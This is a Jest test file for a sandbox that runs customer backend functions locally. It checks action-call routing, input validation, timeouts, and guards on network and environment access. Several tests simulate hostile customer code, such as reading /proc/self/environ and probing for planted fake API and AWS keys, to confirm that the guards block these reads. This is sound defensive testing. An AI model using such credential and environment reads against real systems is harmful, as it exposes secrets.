// Unless explicitly stated otherwise all files in this repository are licensed under the MIT License.
// This product includes software developed at Datadog (https://www.datadoghq.com/).
// Copyright 2019-Present Datadog, Inc.

/* global globalThis, NodeJS */

import type { Logger } from '@dd/core/types';
import { installFakeProcessEnv } from '@dd/tests/_jest/helpers/env';
import { mockLogFn, mockLogger, moduleResolverFor } from '@dd/tests/_jest/helpers/mocks';
import fs from 'fs';

import * as shared from '../backend/shared';
import type { BackendFunction } from '../backend/types';
import { LOCAL_EXECUTION_LOAD_SUFFIX } from '../constants';

import { forceResetEnv } from './env-guard';
import {
    func,
    makePreviewRuntimeContext,
    stubExecuteAction,
    stubGetRuntimeContext,
} from './local-execution.fixtures';
import type { ExecuteAction, LoadModule } from './local-execution';
import {
    DEFAULT_LONG_POLLING_CONFIG,
    DEFAULT_TIMEOUT_MS,
    deriveActionTimeouts,
    executeScriptLocally as executeScriptLocallyWithRuntimeContext,
} from './local-execution';
import { forceReset } from './network-guard';

const funcWithConnection: BackendFunction = { ...func, allowedConnectionIds: ['conn-1'] };

const TEST_PROJECT_ROOT = '/project';

interface TestGlobalDollar {
    backendFunctionArgs: unknown[];
    // Left untyped: $.Actions is a Proxy of unbounded, dynamic depth ($.Actions.<any>.<any>...(...)), the same shape a real customer's untyped code sees.
    Actions: any;
    Source: { initiator: { id: string; orgId: string }; runAsUser: { id: string; orgId: string } };
    previewMetadata?: unknown;
}

/** Reads the `$` local-execution.ts installs onto `globalThis` via `Object.defineProperty` — genuinely untyped, so the cast is centralized here instead of repeated at each call site. */
function testDollar(): TestGlobalDollar {
    return (globalThis as unknown as { $: TestGlobalDollar }).$;
}

beforeEach(() => {
    // Neither optional SDK is installed by default; tests exercising the "installed" path override this.
    jest.spyOn(shared, 'isActionCatalogInstalled').mockReturnValue(false);
    jest.spyOn(shared, 'isDatadogAppsBackendInstalled').mockReturnValue(false);
});

/** Keeps the existing test call sites concise while every invocation receives a fresh preview context. */
function executeScriptLocally(
    backendFunction: BackendFunction,
    projectRoot: string,
    args: unknown[],
    executeAction: ExecuteAction,
    loadModule: LoadModule,
    log: Logger,
    timeoutMs: number = DEFAULT_TIMEOUT_MS,
    primedEntry?: Record<string, unknown>,
    longPolling = DEFAULT_LONG_POLLING_CONFIG,
) {
    return executeScriptLocallyWithRuntimeContext(
        backendFunction,
        projectRoot,
        args,
        executeAction,
        stubGetRuntimeContext,
        loadModule,
        log,
        timeoutMs,
        primedEntry,
        longPolling,
    );
}

// Same reasoning as network-guard.test.ts's own afterEach, plus process.env: it's also a
// process-wide singleton, so a test that leaves it swapped would otherwise leak into every later
// test in this Jest worker.
afterEach(() => {
    forceReset();
    forceResetEnv();
});

/** A `loadModule` double that resolves the customer's function from a map and rejects anything else with a module-not-found error, matching the common case where neither optional package is installed. */
function loadModuleReturning(exports: Record<string, unknown>): LoadModule {
    return moduleResolverFor(func, exports);
}

const ORDER_MARKER = '__ddLocalExecutionTestOrder';

// `(globalThis as { fetch: typeof fetch }).fetch = impl` repeated verbatim at every mock/restore
// call site — this collapses the cast to one place.
function setGlobalFetch(impl: typeof fetch): void {
    (globalThis as { fetch: typeof fetch }).fetch = impl;
}

// `getNetworkGuard()`'s lazy `import('./network-guard')` (see local-execution.ts) defers
// network-guard.ts's module-load-time side effects (process-wide monkeypatches on net.Socket,
// fetch, dgram, dns, child_process, worker_threads.Worker) until local execution actually runs,
// instead of installing them the moment any bundler transitively imports this file via index.ts.
// Not unit-testable under Jest: ts-jest doesn't route TypeScript-compiled modules through Node's
// native `require.cache`, so inspecting it can't distinguish an eagerly- from a lazily-loaded
// module here. Verified instead by bundling this file with esbuild (matching what a real
// non-Vite consumer of the apps plugin actually does) and confirming the compiled output wraps
// `getNetworkGuard`'s call in `Promise.resolve().then(() => init_network_guard())` — esbuild's
// standard lazy-CJS-module pattern — rather than requiring network-guard.ts eagerly at the top
// of the bundle.

describe('local-execution — executeScriptLocally', () => {
    test('Should run a simple function in-process and return its result', async () => {
        const result = await executeScriptLocally(
            func,
            TEST_PROJECT_ROOT,
            [21],
            stubExecuteAction,
            loadModuleReturning({ example: (n: number) => n * 2 }),
            mockLogger,
        );
        expect(result).toEqual({ data: 42 });
    });

    test('Should pick up a changed loadModule result on a subsequent call, not a stale cached result', async () => {
        const first = await executeScriptLocally(
            func,
            TEST_PROJECT_ROOT,
            [],
            stubExecuteAction,
            loadModuleReturning({ example: () => 1 }),
            mockLogger,
        );
        const second = await executeScriptLocally(
            func,
            TEST_PROJECT_ROOT,
            [],
            stubExecuteAction,
            loadModuleReturning({ example: () => 2 }),
            mockLogger,
        );
        expect(first).toEqual({ data: 1 });
        expect(second).toEqual({ data: 2 });
    });

    test('Should reject with a clear error when the named export is missing from the loaded module', async () => {
        await expect(
            executeScriptLocally(
                func,
                TEST_PROJECT_ROOT,
                [],
                stubExecuteAction,
                loadModuleReturning({ somethingElse: () => 1 }),
                mockLogger,
            ),
        ).rejects.toThrow(`"example" is not a function exported from ${func.absolutePath}`);
    });

    test('Should read $ as undefined when a customer module reaches for it during its own top-level evaluation, matching production module-evaluation order', async () => {
        let dollarDuringModuleLoad: unknown = 'not captured';
        const loadModule: LoadModule = async (specifier) => {
            if (specifier === func.absolutePath + LOCAL_EXECUTION_LOAD_SUFFIX) {
                // Production's static import also runs before its wrapper installs $, so $ isn't a
                // global property yet — reading it must resolve to undefined the same way locally,
                // not throw (typeof $ never throws on an unresolvable reference in production).
                dollarDuringModuleLoad = (globalThis as Record<string, unknown>).$;
                return { example: () => 'done' };
            }
            const notFoundError: NodeJS.ErrnoException = new Error(
                `Cannot find module '${specifier}'`,
            );
            notFoundError.code = 'MODULE_NOT_FOUND';
            throw notFoundError;
        };

        const result = await executeScriptLocally(
            func,
            TEST_PROJECT_ROOT,
            [],
            stubExecuteAction,
            loadModule,
            mockLogger,
        );

        expect(result).toEqual({ data: 'done' });
        expect(dollarDuringModuleLoad).toBeUndefined();
    });

    test("Should scope process.env during a customer module's own top-level evaluation, not expose the dev server's real environment", async () => {
        process.env.DD_TEST_REAL_SECRET = 'sk_live_real_secret';
        let secretDuringModuleLoad: unknown = 'not captured';
        const loadModule: LoadModule = async (specifier) => {
            if (specifier === func.absolutePath + LOCAL_EXECUTION_LOAD_SUFFIX) {
                secretDuringModuleLoad = process.env.DD_TEST_REAL_SECRET;
                return { example: () => 'done' };
            }
            const notFoundError: NodeJS.ErrnoException = new Error(
                `Cannot find module '${specifier}'`,
            );
            notFoundError.code = 'MODULE_NOT_FOUND';
            throw notFoundError;
        };

        try {
            const result = await executeScriptLocally(
                func,
                TEST_PROJECT_ROOT,
                [],
                stubExecuteAction,
                loadModule,
                mockLogger,
            );

            expect(result).toEqual({ data: 'done' });
            expect(secretDuringModuleLoad).toBeUndefined();
            expect(process.env.DD_TEST_REAL_SECRET).toBe('sk_live_real_secret');
        } finally {
            delete process.env.DD_TEST_REAL_SECRET;
        }
    });

    test("Should install the fs environ guard before a customer module's own top-level evaluation runs, not just during the exported function's own body", async () => {
        if (process.platform !== 'linux') {
            return;
        }

        let threwDuringModuleLoad = false;
        const loadModule: LoadModule = async (specifier) => {
            if (specifier === func.absolutePath + LOCAL_EXECUTION_LOAD_SUFFIX) {
                try {
                    fs.readFileSync('/proc/self/environ');
                } catch {
                    threwDuringModuleLoad = true;
                }
                return { example: () => 'done' };
            }
            const notFoundError: NodeJS.ErrnoException = new Error(
                `Cannot find module '${specifier}'`,
            );
            notFoundError.code = 'MODULE_NOT_FOUND';
            throw notFoundError;
        };

        const result = await executeScriptLocally(
            func,
            TEST_PROJECT_ROOT,
            [],
            stubExecuteAction,
            loadModule,
            mockLogger,
        );

        expect(result).toEqual({ data: 'done' });
        expect(threwDuringModuleLoad).toBe(true);
    });

    test("Should return a pre-existing globalThis.$ during a customer module's top-level evaluation when something (e.g. zx/globals) seeded it before this module loaded", async () => {
        const originalDescriptor = Object.getOwnPropertyDescriptor(globalThis, '$');
        const preExisting = { fromZxGlobals: true };
        (globalThis as Record<string, unknown>).$ = preExisting;
        let isolatedExecuteScriptLocally!: typeof executeScriptLocallyWithRuntimeContext;
        try {
            jest.isolateModules(() => {
                // A fresh module instance re-runs its Reflect.has check with preExisting already set; the outer instance was imported too early to exercise this path.
                isolatedExecuteScriptLocally = require('./local-execution').executeScriptLocally;
            });

            let dollarDuringModuleLoad: unknown = 'not captured';
            const loadModule: LoadModule = async (specifier) => {
                if (specifier === func.absolutePath + LOCAL_EXECUTION_LOAD_SUFFIX) {
                    dollarDuringModuleLoad = (globalThis as Record<string, unknown>).$;
                    return { example: () => 'done' };
                }
                throw new Error(`Cannot find module '${specifier}'`);
            };

            const result = await isolatedExecuteScriptLocally(
                func,
                TEST_PROJECT_ROOT,
                [],
                stubExecuteAction,
                stubGetRuntimeContext,
                loadModule,
                mockLogger,
            );
            expect(result).toEqual({ data: 'done' });
            expect(dollarDuringModuleLoad).toBe(preExisting);
        } finally {
            if (originalDescriptor) {
                Object.defineProperty(globalThis, '$', originalDescriptor);
            } else {
                delete (globalThis as Record<string, unknown>).$;
            }
        }
    });

    test('Should reinstall the $ accessor if a customer execution deleted globalThis.$, so a later execution can still use it', async () => {
        await executeScriptLocally(
            func,
            TEST_PROJECT_ROOT,
            [],
            stubExecuteAction,
            loadModuleReturning({
                example: () => {
                    delete (globalThis as Record<string, unknown>).$;
                    return 'first';
                },
            }),
            mockLogger,
        );

        const second = await executeScriptLocally(
            func,
            TEST_PROJECT_ROOT,
            [],
            stubExecuteAction,
            loadModuleReturning({ example: () => testDollar().backendFunctionArgs }),
            mockLogger,
        );
        expect(second).toEqual({ data: [] });
    });

    test("Should not leak one execution's top-level zx/globals-style $ write into a later execution's own top-level load", async () => {
        const firstLoadModule: LoadModule = async (specifier) => {
            if (specifier === func.absolutePath + LOCAL_EXECUTION_LOAD_SUFFIX) {
                // Simulates a top-level side effect (e.g. `import 'zx/globals'`) writing $ before this execution's box exists.
                (globalThis as Record<string, unknown>).$ = {
                    fromFirstExecutionTopLevel: true,
                };
                return { example: () => 'first' };
            }
            throw new Error(`Cannot find module '${specifier}'`);
        };
        await executeScriptLocally(
            func,
            TEST_PROJECT_ROOT,
            [],
            stubExecuteAction,
            firstLoadModule,
            mockLogger,
        );

        let dollarDuringSecondLoad: unknown = 'not captured';
        const secondLoadModule: LoadModule = async (specifier) => {
            if (specifier === func.absolutePath + LOCAL_EXECUTION_LOAD_SUFFIX) {
                dollarDuringSecondLoad = (globalThis as Record<string, unknown>).$;
                return { example: () => 'second' };
            }
            throw new Error(`Cannot find module '${specifier}'`);
        };
        await executeScriptLocally(
            func,
            TEST_PROJECT_ROOT,
            [],
            stubExecuteAction,
            secondLoadModule,
            mockLogger,
        );

        expect(dollarDuringSecondLoad).toBeUndefined();
    });

    test('Should reject when loadModule itself rejects, same as a native-module load failure would', async () => {
        // Simulates a native addon failing to load at import time — not a customer function throwing.
        const loadModule: LoadModule = async () => {
            throw new Error('cannot find native module');
        };
        await expect(
            executeScriptLocally(
                func,
                TEST_PROJECT_ROOT,
                [],
                stubExecuteAction,
                loadModule,
                mockLogger,
            ),
        ).rejects.toThrow('cannot find native module');
    });

    test('Should resolve a $.Actions.foo.bar(...) call through the injected executeAction, including connectionId', async () => {
        const executeAction = jest.fn().mockResolvedValue({ ok: true });
        const result = await executeScriptLocally(
            funcWithConnection,
            TEST_PROJECT_ROOT,
            [],
            executeAction,
            loadModuleReturning({
                example: () =>
                    testDollar().Actions.slack.chat.postMessage({
                        inputs: { text: 'hi' },
                        connectionId: 'conn-1',
                    }),
            }),
            mockLogger,
        );
        expect(result).toEqual({ data: { ok: true } });
        expect(executeAction).toHaveBeenCalledWith(
            'com.datadoghq.slack.chat.postMessage',
            { text: 'hi' },
            'conn-1',
        );
    });

    test('Should reject with a clear error, not hang, when a customer function returns an un-invoked $.Actions reference instead of calling it', async () => {
        // Returning $.Actions.slack.chat un-invoked must not be mistaken for a thenable (hang) or leak an unhandled rejection — just the ordinary "can't be serialized" error.
        await expect(
            executeScriptLocally(
                func,
                TEST_PROJECT_ROOT,
                [],
                stubExecuteAction,
                loadModuleReturning({
                    example: () => testDollar().Actions.slack.chat,
                }),
                mockLogger,
                20,
            ),
        ).rejects.toThrow(/JSON\.stringify silently drops/);
    });

    test('Should resolve a single-segment $.Actions.foo(...) call to a single-segment fqn', async () => {
        const executeAction = jest.fn().mockResolvedValue({ ok: true });
        const result = await executeScriptLocally(
            func,
            TEST_PROJECT_ROOT,
            [],
            executeAction,
            loadModuleReturning({
                example: () => testDollar().Actions.foo({ inputs: { text: 'hi' } }),
            }),
            mockLogger,
        );
        expect(result).toEqual({ data: { ok: true } });
        expect(executeAction).toHaveBeenCalledWith('com.datadoghq.foo', { text: 'hi' }, undefined);
    });

    test('Should resolve a $.Actions(...) call with no property access to a trailing-dot fqn with no action name segment', async () => {
        // Documents current behavior: pathParts is empty at this call site, so `com.datadoghq.${pathParts.join('.')}` yields a malformed fqn rather than being rejected.
        const executeAction = jest.fn().mockResolvedValue({ ok: true });
        const result = await executeScriptLocally(
            func,
            TEST_PROJECT_ROOT,
            [],
            executeAction,
            loadModuleReturning({
                example: () => testDollar().Actions({ inputs: { text: 'hi' } }),
            }),
            mockLogger,
        );
        expect(result).toEqual({ data: { ok: true } });
        expect(executeAction).toHaveBeenCalledWith('com.datadoghq.', { text: 'hi' }, undefined);
    });

    test('Should resolve a deeply nested $.Actions.a.b.c.d(...) call to its full dotted fqn', async () => {
        const executeAction = jest.fn().mockResolvedValue({ ok: true });
        const result = await executeScriptLocally(
            func,
            TEST_PROJECT_ROOT,
            [],
            executeAction,
            loadModuleReturning({
                example: () => testDollar().Actions.a.b.c.d({ inputs: { text: 'hi' } }),
            }),
            mockLogger,
        );
        expect(result).toEqual({ data: { ok: true } });
        expect(executeAction).toHaveBeenCalledWith(
            'com.datadoghq.a.b.c.d',
            { text: 'hi' },
            undefined,
        );
    });

    test("Should reject a $.Actions call whose connectionId isn't in the function's allowedConnectionIds", async () => {
        const executeAction = jest.fn().mockResolvedValue({ ok: true });
        await expect(
            executeScriptLocally(
                func,
                TEST_PROJECT_ROOT,
                [],
                executeAction,
                loadModuleReturning({
                    example: () =>
                        testDollar().Actions.slack.chat.postMessage({
                            inputs: { text: 'hi' },
                            connectionId: 'conn-not-allowed',
                        }),
                }),
                mockLogger,
            ),
        ).rejects.toThrow(/not in this function's allowed connections/);
        expect(executeAction).not.toHaveBeenCalled();
    });

    test('Should allow a $.Actions call with no connectionId regardless of allowedConnectionIds', async () => {
        const executeAction = jest.fn().mockResolvedValue({ ok: true });
        const result = await executeScriptLocally(
            func,
            TEST_PROJECT_ROOT,
            [],
            executeAction,
            loadModuleReturning({
                example: () =>
                    testDollar().Actions.slack.chat.postMessage({
                        inputs: { text: 'hi' },
                    }),
            }),
            mockLogger,
        );
        expect(result).toEqual({ data: { ok: true } });
    });

    test('Should reject when the action call is missing an inputs field', async () => {
        await expect(
            executeScriptLocally(
                func,
                TEST_PROJECT_ROOT,
                [],
                stubExecuteAction,
                loadModuleReturning({
                    example: () => testDollar().Actions.slack.chat.postMessage({}),
                }),
                mockLogger,
            ),
        ).rejects.toThrow(/must have an inputs field/);
    });

    // validateActionCall's own `typeof inputs !== 'object'` check passes an array through
    // unchanged (typeof [] === 'object'), but serializeActionInputs's shape check downstream
    // rejects it — inputs is semantically a plain object of named parameters, and a caller relying
    // on `Record`-shaped inputs must never actually receive an array.
    test('Should reject an array as inputs, since inputs is semantically a plain object of named parameters', async () => {
        await expect(
            executeScriptLocally(
                func,
                TEST_PROJECT_ROOT,
                [],
                stubExecuteAction,
                loadModuleReturning({
                    example: () =>
                        testDollar().Actions.slack.chat.postMessage({ inputs: ['a', 'b'] }),
                }),
                mockLogger,
            ),
        ).rejects.toThrow(/Inputs to action.*must be a plain object.*top-level shape to an array/);
    });

    test('Should reject a $.Actions call whose inputs contain a Map, instead of silently sending {} to the destination action', async () => {
        await expect(
            executeScriptLocally(
                func,
                TEST_PROJECT_ROOT,
                [],
                stubExecuteAction,
                loadModuleReturning({
                    example: () =>
                        testDollar().Actions.slack.chat.postMessage({
                            inputs: { text: new Map([['a', 1]]) },
                        }),
                }),
                mockLogger,
            ),
        ).rejects.toThrow(/Inputs to action.*silently flattens/);
    });

    test('Should reject a $.Actions call whose inputs contain NaN, instead of silently sending null to the destination action', async () => {
        await expect(
            executeScriptLocally(
                func,
                TEST_PROJECT_ROOT,
                [],
                stubExecuteAction,
                loadModuleReturning({
                    example: () =>
                        testDollar().Actions.slack.chat.postMessage({
                            inputs: { score: NaN },
                        }),
                }),
                mockLogger,
            ),
        ).rejects.toThrow(/Inputs to action.*silently converts to "null"/);
    });

    // Regression test: production's own JSON serialization of $.Actions inputs already silently
    // omits an undefined-valued object property (e.g. `threadId: options?.threadId`) rather than
    // erroring — a common optional-field pattern that must behave the same way locally.
    test('Should silently omit an undefined-valued object property from $.Actions inputs, matching real JSON.stringify/production behavior', async () => {
        const executeAction = jest.fn().mockResolvedValue({ ok: true });
        const result = await executeScriptLocally(
            func,
            TEST_PROJECT_ROOT,
            [],
            executeAction,
            loadModuleReturning({
                example: () =>
                    testDollar().Actions.slack.chat.postMessage({
                        inputs: { text: 'hi', threadId: undefined },
                    }),
            }),
            mockLogger,
        );
        expect(result).toEqual({ data: { ok: true } });
        expect(executeAction).toHaveBeenCalledWith(
            'com.datadoghq.slack.chat.postMessage',
            { text: 'hi' },
            undefined,
        );
    });

    // Unlike an object property, JSON.stringify silently converts an array element's undefined to
    // null instead of dropping it — real corruption, so this case still needs to be caught.
    test('Should reject a $.Actions call whose inputs contain undefined inside an array, instead of silently sending null to the destination action', async () => {
        await expect(
            executeScriptLocally(
                func,
                TEST_PROJECT_ROOT,
                [],
                stubExecuteAction,
                loadModuleReturning({
                    example: () =>
                        testDollar().Actions.slack.chat.postMessage({
                            inputs: { items: ['a', undefined, 'b'] },
                        }),
                }),
                mockLogger,
            ),
        ).rejects.toThrow(/Inputs to action.*undefined inside an array.*silently converts to null/);
    });

    // A top-level toJSON() can change the round-tripped value's shape entirely (object -> string),
    // which the JSON-corruption checks above don't catch — they validate what's inside the value,
    // not what type the whole thing ends up being. Callers depend on getting a plain object back.
    test('Should reject a $.Actions call whose inputs round-trip to something other than a plain object via a top-level toJSON()', async () => {
        await expect(
            executeScriptLocally(
                func,
                TEST_PROJECT_ROOT,
                [],
                stubExecuteAction,
                loadModuleReturning({
                    example: () =>
                        testDollar().Actions.slack.chat.postMessage({
                            inputs: { toJSON: () => 'not an object' },
                        }),
                }),
                mockLogger,
            ),
        ).rejects.toThrow(/Inputs to action.*must be a plain object.*top-level shape to string/);
    });

    test('Should reject with the thrown message when the customer function throws synchronously', async () => {
        await expect(
            executeScriptLocally(
                func,
                TEST_PROJECT_ROOT,
                [],
                stubExecuteAction,
                loadModuleReturning({
                    example: () => {
                        throw new Error('boom');
                    },
                }),
                mockLogger,
            ),
        ).rejects.toThrow('boom');
    });

    // Regression test: the "late failure" log fires only for an execution abandoned after the caller stopped waiting (see the test below) — here the caller is still waiting and gets the error via `rejects.toThrow` above.
    test('Should not log a "caller had already stopped waiting" message for an ordinary, timely rejection', async () => {
        await expect(
            executeScriptLocally(
                func,
                TEST_PROJECT_ROOT,
                [],
                stubExecuteAction,
                loadModuleReturning({
                    example: () => {
                        throw new Error('boom');
                    },
                }),
                mockLogger,
            ),
        ).rejects.toThrow('boom');

        expect(mockLogFn).not.toHaveBeenCalledWith(
            expect.stringContaining('already stopped waiting'),
            'debug',
        );
    });

    test('Should reject with the rejection reason when the customer function rejects asynchronously', async () => {
        await expect(
            executeScriptLocally(
                func,
                TEST_PROJECT_ROOT,
                [],
                stubExecuteAction,
                loadModuleReturning({ example: () => Promise.reject(new Error('async boom')) }),
                mockLogger,
            ),
        ).rejects.toThrow('async boom');
    });

    test('Should time out a hung async function with an explicit, attributed error', async () => {
        await expect(
            executeScriptLocally(
                func,
                TEST_PROJECT_ROOT,
                [],
                stubExecuteAction,
                loadModuleReturning({ example: () => new Promise(() => {}) }),
                mockLogger,
                50,
            ),
        ).rejects.toThrow(/timed out after 50ms/);
    });

    // Proves the hang-detection timer only fires for a genuinely stuck execution, not for a legitimate in-flight $.Actions call that's still comfortably within its budget.
    test('Should resolve normally when a legitimate in-flight $.Actions call finishes well within the timeout, without the hang-detection timer misfiring', async () => {
        const executeAction: ExecuteAction = jest.fn(
            () => new Promise((resolve) => setTimeout(() => resolve({ ok: true }), 50)),
        );
        const result = await executeScriptLocally(
            funcWithConnection,
            TEST_PROJECT_ROOT,
            [],
            executeAction,
            loadModuleReturning({
                example: () =>
                    testDollar().Actions.slack.chat.postMessage({
                        inputs: { text: 'hi' },
                        connectionId: 'conn-1',
                    }),
            }),
            mockLogger,
            500,
        );
        expect(result).toEqual({ data: { ok: true } });
    });

    // The caller already moved on after the timeout rejection above; this covers the abandoned execution's own eventual failure, which has no caller left to report it to.
    test('Should log a late failure from an abandoned execution instead of swallowing it silently', async () => {
        let rejectHung: ((error: Error) => void) | undefined;
        await expect(
            executeScriptLocally(
                func,
                TEST_PROJECT_ROOT,
                [],
                stubExecuteAction,
                loadModuleReturning({
                    example: () =>
                        new Promise((_resolve, reject) => {
                            rejectHung = reject;
                        }),
                }),
                mockLogger,
                50,
            ),
        ).rejects.toThrow(/timed out after 50ms/);

        rejectHung?.(new Error('late failure after caller stopped waiting'));
        await new Promise((resolve) => setTimeout(resolve, 0));

        expect(mockLogFn).toHaveBeenCalledWith(
            expect.stringContaining('late failure after caller stopped waiting'),
            'debug',
        );
    });

    // Stands in for makeExecuteActionRemotely's long-poll, which can legitimately outlast a
    // short hang-detection timeout — that's network wait, not a hung function.
    test('Should not time out while a real $.Actions call is still legitimately in flight, even past the configured timeout', async () => {
        const slowExecuteAction: ExecuteAction = () =>
            new Promise((resolve) => setTimeout(() => resolve({ ok: true }), 80));

        const result = await executeScriptLocally(
            func,
            TEST_PROJECT_ROOT,
            [],
            slowExecuteAction,
            loadModuleReturning({
                example: () =>
                    testDollar().Actions.slack.chat.postMessage({
                        inputs: { text: 'hi' },
                    }),
            }),
            mockLogger,
            // Shorter than slowExecuteAction's own 80ms.
            50,
        );

        expect(result).toEqual({ data: { ok: true } });
    });

    // Without a bound on the $.Actions call itself, a stalled request would wedge this
    // execution and every request queued behind it via `enqueue` indefinitely.
    test('Should eventually time out an in-flight $.Actions call that never settles, and not wedge subsequently queued executions', async () => {
        jest.useFakeTimers();
        try {
            const neverSettlingExecuteAction: ExecuteAction = () => new Promise(() => {});

            const hungExecution = executeScriptLocally(
                func,
                TEST_PROJECT_ROOT,
                [],
                neverSettlingExecuteAction,
                loadModuleReturning({
                    example: () =>
                        testDollar().Actions.slack.chat.postMessage({
                            inputs: { text: 'hi' },
                        }),
                }),
                mockLogger,
                50,
            );
            // Enqueued behind hungExecution — if the fix didn't bound the
            // stalled $.Actions call, this would never get a turn either.
            const queuedNext = executeScriptLocally(
                func,
                TEST_PROJECT_ROOT,
                [],
                stubExecuteAction,
                loadModuleReturning({ example: () => 'next' }),
                mockLogger,
            );

            const { totalExecutionTimeoutMs } = deriveActionTimeouts(DEFAULT_LONG_POLLING_CONFIG);
            const hungAssertion = (async () => {
                await expect(hungExecution).rejects.toThrow(
                    new RegExp(
                        `exceeded the absolute ${totalExecutionTimeoutMs}ms execution ceiling`,
                    ),
                );
            })();

            await jest.runAllTimersAsync();
            await hungAssertion;

            expect(await queuedNext).toEqual({ data: 'next' });
        } finally {
            jest.useRealTimers();
        }
    });

    // A fire-and-forget $.Actions call pauses the per-call hang-detection timer for as long as it
    // stays in flight (up to the derived per-call ceiling), even though the customer function has
    // moved on — the absolute execution ceiling below must still fire well before that.
    test('Should eventually time out via an absolute execution ceiling, independent of any $.Actions call still in flight', async () => {
        jest.useFakeTimers();
        try {
            const neverSettlingExecuteAction: ExecuteAction = () => new Promise(() => {});

            const execution = executeScriptLocally(
                func,
                TEST_PROJECT_ROOT,
                [],
                neverSettlingExecuteAction,
                loadModuleReturning({
                    example: () =>
                        testDollar().Actions.slack.chat.postMessage({
                            inputs: { text: 'hi' },
                        }),
                }),
                mockLogger,
                50,
            );

            const { totalExecutionTimeoutMs } = deriveActionTimeouts(DEFAULT_LONG_POLLING_CONFIG);
            const assertion = (async () => {
                await expect(execution).rejects.toThrow(
                    new RegExp(
                        `exceeded the absolute ${totalExecutionTimeoutMs}ms execution ceiling`,
                    ),
                );
            })();

            await jest.advanceTimersByTimeAsync(totalExecutionTimeoutMs);
            await assertion;
        } finally {
            jest.useRealTimers();
        }
    });

    // Regression test: the absolute ceiling used to be a single fixed window from execution
    // start, so two genuinely healthy sequential calls (each individually within bounds) could
    // still sum past it. Re-arming the ceiling on each new call fixes that without weakening the
    // hang protection above, which relies on the call never re-arming it at all.
    test('Should not reject a function whose sequential $.Actions calls each individually stay within the absolute ceiling but sum past it', async () => {
        jest.useFakeTimers();
        try {
            const { totalExecutionTimeoutMs } = deriveActionTimeouts(DEFAULT_LONG_POLLING_CONFIG);
            const delayedExecuteAction: ExecuteAction = () =>
                new Promise((resolve) => {
                    setTimeout(() => resolve('ok'), totalExecutionTimeoutMs - 10);
                });

            const execution = executeScriptLocally(
                func,
                TEST_PROJECT_ROOT,
                [],
                delayedExecuteAction,
                loadModuleReturning({
                    example: async () => {
                        await testDollar().Actions.slack.chat.postMessage({
                            inputs: { text: 'first' },
                        });
                        await testDollar().Actions.slack.chat.postMessage({
                            inputs: { text: 'second' },
                        });
                        return 'done';
                    },
                }),
                mockLogger,
            );

            await jest.advanceTimersByTimeAsync(totalExecutionTimeoutMs * 2);
            await expect(execution).resolves.toEqual({ data: 'done' });
        } finally {
            jest.useRealTimers();
        }
    });

    test('Should still time out a function that hangs with no $.Actions call in flight, even after an earlier call in the same run completed', async () => {
        const executeAction: ExecuteAction = async () => ({ ok: true });

        await expect(
            executeScriptLocally(
                func,
                TEST_PROJECT_ROOT,
                [],
                executeAction,
                loadModuleReturning({
                    example: async () => {
                        await testDollar().Actions.slack.chat.postMessage({
                            inputs: { text: 'hi' },
                        });
                        // Hangs with no further $.Actions call — the fresh timeout window from the completed call above must still expire normally.
                        return new Promise(() => {});
                    },
                }),
                mockLogger,
                50,
            ),
        ).rejects.toThrow(/timed out after 50ms/);
    });

    test("Should keep a hung function's own late continuation blocked after timeout, while a fresh execution afterward still works normally", async () => {
        let lateNetworkAttempt: Promise<unknown> | undefined;

        await expect(
            executeScriptLocally(
                func,
                TEST_PROJECT_ROOT,
                [],
                stubExecuteAction,
                loadModuleReturning({
                    example: () =>
                        new Promise(() => {
                            // Scheduled, not awaited, so `example` never settles and the race
                            // below times out normally — fires after that 50ms timeout, not before.
                            setTimeout(() => {
                                lateNetworkAttempt = fetch('https://example.com');
                                lateNetworkAttempt.catch(() => undefined);
                            }, 100);
                        }),
                }),
                mockLogger,
                50,
            ),
        ).rejects.toThrow(/timed out after 50ms/);

        // Lets the hung function's own delayed continuation fire, well after the timeout above.
        await new Promise((resolve) => setTimeout(resolve, 100));

        // The abandoned continuation's own async chain stays permanently blocked (by design), so
        // its late network attempt must still be rejected — an identity check on the guarded
        // property can't verify this, since the wrapper never changes identity either way.
        expect(lateNetworkAttempt).toBeDefined();
        await expect(lateNetworkAttempt).rejects.toThrow(/Network access is not allowed/);

        // A fresh execution afterward must still work normally — the abandoned scope above must
        // not permanently wedge network/action access for everything that runs after it.
        const result = await executeScriptLocally(
            func,
            TEST_PROJECT_ROOT,
            [],
            stubExecuteAction,
            loadModuleReturning({
                example: () =>
                    testDollar().Actions.slack.chat.postMessage({ inputs: { text: 'hi' } }),
            }),
            mockLogger,
        );
        expect(result).toEqual({ data: { data: null, stub: true, fqn: expect.any(String) } });
    });

    describe('env-guard integration', () => {
        // Tests below spread process.env into an override object and assert on it; a failing
        // assertion's Jest diff would otherwise serialize whatever process.env holds at that point,
        // including this CI job's own real secrets. `originalEnv` is a small, fully-fake base
        // instead of the real environment, so a failure here can only ever leak a placeholder.
        const originalEnv: NodeJS.ProcessEnv = {
            PATH: '/usr/bin',
            HOME: '/home/dev',
            NODE_ENV: 'development',
            TMPDIR: '/tmp',
        };

        installFakeProcessEnv(originalEnv, { resetBetweenTests: true });

        test("Should never expose the dev server's own DD_API_KEY to the customer function", async () => {
            process.env = { ...originalEnv, DD_API_KEY: 'the-dev-servers-own-api-key' };

            const result = await executeScriptLocally(
                func,
                TEST_PROJECT_ROOT,
                [],
                stubExecuteAction,
                loadModuleReturning({
                    example: () => typeof process.env.DD_API_KEY === 'undefined',
                }),
                mockLogger,
            );

            expect(result).toEqual({ data: true });
        });

        test("Should never expose an AWS-like credential from the developer's own shell to the customer function", async () => {
            process.env = { ...originalEnv, AWS_SECRET_ACCESS_KEY: 'super-secret-aws-key' };

            const result = await executeScriptLocally(
                func,
                TEST_PROJECT_ROOT,
                [],
                stubExecuteAction,
                loadModuleReturning({
                    example: () => typeof process.env.AWS_SECRET_ACCESS_KEY === 'undefined',
                }),
                mockLogger,
            );

            expect(result).toEqual({ data: true });
        });

        test('Should still expose PATH/HOME/NODE_ENV/TMPDIR to the customer function when set in the real environment', async () => {
            process.env = {
                ...originalEnv,
                PATH: '/usr/bin',
                HOME: '/home/dev',
                NODE_ENV: 'development',
                TMPDIR: '/tmp',
            };

            const result = await executeScriptLocally(
                func,
                TEST_PROJECT_ROOT,
                [],
                stubExecuteAction,
                loadModuleReturning({
                    example: () => ({
                        PATH: process.env.PATH,
                        HOME: process.env.HOME,
                        NODE_ENV: process.env.NODE_ENV,
                        TMPDIR: process.env.TMPDIR,
                    }),
                }),
                mockLogger,
            );

            expect(result).toEqual({
                data: {
                    PATH: '/usr/bin',
                    HOME: '/home/dev',
